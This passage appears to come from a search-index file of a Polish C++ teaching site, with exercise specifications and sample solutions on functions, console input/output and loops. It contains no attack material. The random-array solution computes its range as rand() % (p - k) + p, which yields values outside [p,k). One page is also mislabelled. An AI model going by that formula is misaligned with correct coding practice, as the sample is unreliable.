<li>\\(n\\)-elementowa tablica losowych liczb ca\u0142kowitych z przedzia\u0142u \\([p,k)\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cstdlib&gt;\n\nusing namespace std;\n\nvoid losuj(int n, int tab[], int p, int k) {\n  srand(time(NULL));\n\n  for(int i = 0; i &lt; n; i++) {\n    tab[i] = (rand() % (p - k)) + p;\n  }\n}\n\nvoid wypisz(int n, int tab[]) {\n  for(int i = 0; i &lt; n; i++) {\n    cout &lt;&lt; tab[i] &lt;&lt; \" \";\n  }\n\n  cout &lt;&lt; endl;\n}\n\nint main() {\n  int n, p, k;\n\n  cout &lt;&lt; \"Podaj rozmiar tablicy:\" &lt;&lt; endl;\n  cin &gt;&gt; n;\n\n  int tab[n];\n\n  cout &lt;&lt; \"Podaj zakres elementow:\" &lt;&lt; endl;\n  cin &gt;&gt; p &gt;&gt; k;\n\n  losuj(n, tab, p, k);\n\n  cout &lt;&lt; \"Wylosowana tablica:\" &lt;&lt; endl;\n  wypisz(n, tab);\n  return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/exercises/functions/solution-6/","title":"Rozwi\u0105zanie 6","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-6/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wczytywanie tablicy, przemna\u017canie tablicy oraz wypisywanie tablicy na ekranie zrealizuj za pomoc\u0105 osobnych funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(k\\) - liczba ca\u0142kowita</li> <li>\\(tab[n]\\) - tablica liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-6/#wynik","title":"Wynik","text":"<ul> <li>Tablica powsta\u0142a poprzez przemno\u017cenie ka\u017cdego elementu tablicy \\(tab\\) przez liczb\u0119 \\(k\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-6/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid wczytaj(int n, int tab[]) {\n    for(int i = 0; i &lt; n; i++) {\n        cout &lt;&lt; \"Podaj kolejna wartosc:\" &lt;&lt; endl;\n        cin &gt;&gt; tab[i];\n    }\n}\n\nvoid wypisz(int n, int tab[]) {\n    for(int i = 0; i &lt; n; i++) {\n        cout &lt;&lt; tab[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nvoid przemnoz(int n, int tab[], int k) {\n    for(int i = 0; i &lt; n; i++) {\n        tab[i] *= k;\n    }\n}\n\nint main() {\n     int n, k;\n\n    cout &lt;&lt; \"Podaj liczbe elementow:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    cout &lt;&lt; \"Podaj mnoznik:\" &lt;&lt; endl;\n    cin &gt;&gt; k;\n\n    int tab[n];\n\n    wczytaj(n, tab);\n\n    przemnoz(n, tab, k);\n\n    wypisz(n, tab);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/functions/solution-7/","title":"Rozwi\u0105zanie 6","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-7/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wczytywanie tablicy, a tak\u017ce obliczanie ka\u017cdej ze statystyk zrealizuj za pomoc\u0105 osobnych funkcji.</p>"},{"location":"programming/c%2B%2B/exercises/functions/solution-7/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/functions/solution-7/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(tab[n]\\) - tablica liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-7/#wynik","title":"Wynik","text":"<ul> <li>Statystyki tablicy \\(tab\\): minimum, maksimum, suma, \u015brednia</li> </ul>"},{"location":"programming/c%2B%2B/exercises/functions/solution-7/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid wczytaj(int n, int tab[]) {\n  for(int i = 0; i &lt; n; i++) {\n    cout &lt;&lt; \"Podaj wartosc pod indeksem \" &lt;&lt; i &lt;&lt; endl;\n    cin &gt;&gt; tab[i];\n  }\n}\n\nint minimum(int n, int tab[]) {\n  int minimum = tab[0];\n  for(int i = 1; i &lt; n; i++) {\n    if(tab[i] &lt; minimum) {\n      minimum = tab[i];\n    }\n  }\n\n  return minimum;\n}\n\nint maksimum(int n, int tab[]) {\n  int maksimum = tab[0];\n  for(int i = 1; i &lt; n; i++) {\n    if(tab[i] &gt; maksimum) {\n      maksimum = tab[i];\n    }\n  }\n\n  return maksimum;\n}\n\nint suma(int n, int tab[]) {\n  int wynik = 0;\n  for(int i = 0; i &lt; n; i++) {\n    wynik += tab[i];\n  }\n\n  return wynik;\n}\n\ndouble srednia(int n, int tab[]) {\n  double wynik;\n\n  wynik = (double) suma(n, tab) / (double) n;\n\n  return wynik;\n}\n\nint main() {\n  int n;\n\n  cout &lt;&lt; \"Podaj rozmiar tablicy:\" &lt;&lt; endl;\n  cin &gt;&gt; n;\n\n  int tab[n];\n\n  wczytaj(n, tab);\n\n  cout &lt;&lt; \"Minimum: \" &lt;&lt; minimum(n, tab) &lt;&lt; endl;\n  cout &lt;&lt; \"Maksimum: \" &lt;&lt; maksimum(n, tab) &lt;&lt; endl;\n  cout &lt;&lt; \"Suma: \" &lt;&lt; suma(n, tab) &lt;&lt; endl;\n  cout &lt;&lt; \"Srednia: \" &lt;&lt; srednia(n, tab) &lt;&lt; endl;\n\n  return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/exercises/input-output/","title":"Obs\u0142uga wej\u015bcia/wyj\u015bcia","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane","title":"Dane","text":"<ul> <li>\\(imie\\) - ci\u0105g znak\u00f3w, ma\u0142ych i wielkich liter alfabetu angielskiego</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#wynik","title":"Wynik","text":"<ul> <li>Komunikat powitania w formie \"Witaj [imie]!\"</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_1","title":"Dane","text":"<pre><code>imie := \"Damian\"\n</code></pre> <p>Wynik: \"Witaj Damian!\"</p>"},{"location":"programming/c%2B%2B/exercises/input-output/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_2","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#wynik_1","title":"Wynik","text":"<ul> <li>Suma liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_3","title":"Dane","text":"<pre><code>a := 2\nb := 3\n</code></pre> <p>Wynik: \\(5\\) </p>"},{"location":"programming/c%2B%2B/exercises/input-output/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_4","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite, r\u00f3\u017cne od zera</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#wynik_2","title":"Wynik","text":"<ul> <li>Wynik dzielenia liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#przykad_2","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_5","title":"Dane","text":"<pre><code>a := 1\nb := 2\n</code></pre> <p>Wynik: \\(0.5\\) </p>"},{"location":"programming/c%2B%2B/exercises/input-output/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_6","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby naturalne, wi\u0119ksze od zera</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#wynik_3","title":"Wynik","text":"<ul> <li>Wynik dzielenia ca\u0142kowitego oraz reszta z dzielenia liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#przykad_3","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_7","title":"Dane","text":"<pre><code>a := 7\nb := 3\n</code></pre> <p>Wynik: \\(2\\), reszty \\(1\\) </p>"},{"location":"programming/c%2B%2B/exercises/input-output/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p> <p>Info</p> <p>Podpowied\u017a</p> <p>Skorzystaj z funkcji <code>sqrt</code> z biblioteki <code>cmath</code>.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/#specyfikacja_4","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_8","title":"Dane","text":"<ul> <li>\\(a\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#wynik_4","title":"Wynik","text":"<ul> <li>Pierwiastek z \\(a\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#przykad_4","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_9","title":"Dane","text":"<pre><code>a := 4\n</code></pre> <p>Wynik: \\(2\\) </p>"},{"location":"programming/c%2B%2B/exercises/input-output/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wykorzystaj funkcj\u0119 min.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/#specyfikacja_5","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_10","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#wynik_5","title":"Wynik","text":"<ul> <li>Mniejsza z liczb \\(a\\) i \\(b\\), lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#przykad_5","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_11","title":"Dane","text":"<pre><code>a := 5\nb := 3\n</code></pre> <p>Wynik: \\(3\\) </p>"},{"location":"programming/c%2B%2B/exercises/input-output/#zadanie-7","title":"Zadanie 7","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wykorzystaj funkcj\u0119 max.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/#specyfikacja_6","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_12","title":"Dane","text":"<ul> <li>\\(a, b, c\\) - trzy liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#wynik_6","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z liczb \\(a\\), \\(b\\) i \\(c\\) , lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#przykad_6","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_13","title":"Dane","text":"<pre><code>a := 3\nb := 1\nc := 3\n</code></pre> <p>Wynik: \\(3\\) </p>"},{"location":"programming/c%2B%2B/exercises/input-output/#zadanie-8","title":"Zadanie 8","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/#specyfikacja_7","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_14","title":"Dane","text":"<ul> <li>\\(sekundy\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#wynik_7","title":"Wynik","text":"<ul> <li>Czas podany w czytelnej formie \\(H:M:S\\) (\\(H\\) - godziny, \\(M\\) - minuty, \\(S\\) - sekundy)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/#przykad_7","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/input-output/#dane_15","title":"Dane","text":"<pre><code>sekundy := 9179\n</code></pre> <p>Wynik: \\(2:32:59\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(2H=7200S\\) </p> <p>\\(32M=1920S\\) </p> <p>\\(2H+32M+59S=7200S+1920S+59S=9179S\\) </p>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(imie\\) - ci\u0105g znak\u00f3w, ma\u0142ych i wielkich liter alfabetu angielskiego</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-1/#wynik","title":"Wynik","text":"<ul> <li>Komunikat powitania w formie \"Witaj [imie]!\", np. \"Witaj Damian!\"</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    string imie;\n\n    cout &lt;&lt; \"Podaj swoje imie:\" &lt;&lt; endl;\n    cin &gt;&gt; imie;\n\n    cout &lt;&lt; \"Witaj \" &lt;&lt; imie &lt;&lt; \"!\" &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-2/#wynik","title":"Wynik","text":"<ul> <li>Suma liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a, b, suma;\n\n    cout &lt;&lt; \"Podaj dwie liczby:\" &lt;&lt; endl;\n    cin &gt;&gt; a &gt;&gt; b;\n\n    suma = a + b;\n\n    cout &lt;&lt; a &lt;&lt; \" + \" &lt;&lt; b &lt;&lt; \" = \" &lt;&lt; suma &lt;&lt; endl;\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite, r\u00f3\u017cne od zera</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-3/#wynik","title":"Wynik","text":"<ul> <li>Wynik dzielenia liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a, b;\n    double wynik;\n\n    cout &lt;&lt; \"Podaj dwie liczby:\" &lt;&lt; endl;\n    cin &gt;&gt; a &gt;&gt; b;\n\n    wynik = (double)a / (double)b;\n\n    cout &lt;&lt; a &lt;&lt; \" / \" &lt;&lt; b &lt;&lt; \" = \" &lt;&lt; wynik &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-4/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby naturalne, wi\u0119ksze od zera</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-4/#wynik","title":"Wynik","text":"<ul> <li>Wynik dzielenia ca\u0142kowitego oraz reszta z dzielenia liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a, b, div, mod;\n\n    cout &lt;&lt; \"Podaj dwie liczby:\" &lt;&lt; endl;\n    cin &gt;&gt; a &gt;&gt; b;\n\n    div = a / b;\n    mod = a % b;\n\n    cout &lt;&lt; a &lt;&lt; \" / \" &lt;&lt; b &lt;&lt; \" = \" &lt;&lt; div &lt;&lt; \", r. \" &lt;&lt; mod &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-5/#dane","title":"Dane","text":"<ul> <li>\\(a\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-5/#wynik","title":"Wynik","text":"<ul> <li>Pierwiastek z \\(a\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cmath&gt;\n\nusing namespace std;\n\nint main() {\n    int a;\n    double pierwiastek;\n\n    cout &lt;&lt; \"Podaj liczbe:\" &lt;&lt; endl;\n    cin &gt;&gt; a;\n\n    pierwiastek = sqrt(a);\n\n    cout &lt;&lt; \"Pierwiastek z \" &lt;&lt; a &lt;&lt; \" = \" &lt;&lt; pierwiastek &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-6/","title":"Rozwi\u0105zanie 6","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-6/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wykorzystaj funkcj\u0119 min.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-6/#wynik","title":"Wynik","text":"<ul> <li>Mniejsza z liczb \\(a\\) i \\(b\\), lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-6/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a, b, wynik;\n\n    cout &lt;&lt; \"Podaj dwie liczby:\" &lt;&lt; endl;\n    cin &gt;&gt; a &gt;&gt; b;\n\n    wynik = min(a, b);\n\n    cout &lt;&lt; \"Minimum: \" &lt;&lt; wynik &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-7/","title":"Rozwi\u0105zanie 7","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-7/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wykorzystaj funkcj\u0119 max.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-7/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-7/#dane","title":"Dane","text":"<ul> <li>\\(a, b, c\\) - trzy liczby ca\u0142kowite</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-7/#wynik","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z liczb \\(a\\), \\(b\\) i \\(c\\) , lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-7/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a, b, c, wynik;\n\n    cout &lt;&lt; \"Podaj trzy liczby:\" &lt;&lt; endl;\n    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;\n\n    wynik = max(a, b);\n    wynik = max(wynik, c);\n\n    cout &lt;&lt; \"Maksimum: \" &lt;&lt; wynik &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-8/","title":"Rozwi\u0105zanie 8","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-8/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-8/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/input-output/solution-8/#dane","title":"Dane","text":"<ul> <li>\\(sekundy\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-8/#wynik","title":"Wynik","text":"<ul> <li>Czas podany w czytelnej formie ** **\\(H:M:S\\) (\\(H\\) - godziny, \\(M\\) - minuty, \\(S\\) - sekundy)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/input-output/solution-8/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int sekundy, godziny, minuty;\n\n    cout &lt;&lt; \"Podaj liczbe sekund:\" &lt;&lt; endl;\n    cin &gt;&gt; sekundy;\n\n    godziny = sekundy / (60 * 60);\n\n    sekundy = sekundy % (60 * 60);\n\n    minuty = sekundy / 60;\n\n    sekundy = sekundy % 60;\n\n    cout &lt;&lt; godziny &lt;&lt; \":\" &lt;&lt; minuty &lt;&lt; \":\" &lt;&lt; sekundy &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/","title":"P\u0119tla iteracyjna","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#wynik","title":"Wynik","text":"<ul> <li>\\(n!\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji <code>pow</code>.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/#dane_1","title":"Dane","text":"<ul> <li>\\(a, n\\) - dwie liczby naturalne</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#wynik_1","title":"Wynik","text":"<ul> <li>\\(a^n\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/#dane_2","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(n\\)liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#wynik_2","title":"Wynik","text":"<ul> <li>Suma podanych \\(n\\) liczb</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/#dane_3","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, wi\u0119ksza od \\(0\\) </li> <li>\\(n\\)liczb naturalnych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#wynik_3","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z podanych \\(n\\) liczb</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#specyfikacja_4","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/#dane_4","title":"Dane","text":"<ul> <li>\\(n, k\\) - liczby naturalne, wi\u0119ksze od zera</li> <li>\\(n\\)liczb naturalnych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#wynik_4","title":"Wynik","text":"<ul> <li>Ilo\u015b\u0107 liczb podzielnych przez \\(k\\) z podanych \\(n\\) liczb</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#specyfikacja_5","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/#dane_5","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#wynik_5","title":"Wynik","text":"<ul> <li>Tabliczka mno\u017cenia z zakresu \\([1,n]\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#zadanie-7","title":"Zadanie 7","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#specyfikacja_6","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/#dane_6","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#wynik_6","title":"Wynik","text":"<ul> <li>Wszystkie pary liczb naturalnych, kt\u00f3rych suma wynosi \\(n\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/#dane_7","title":"Dane","text":"<pre><code>n := 4\n</code></pre> <p>Wynik: \\((0, 4), (1, 3), (2, 2)\\)</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#zadanie-8","title":"Zadanie 8","text":"<p>Napisz program zgodny z poni\u017csz\u0105 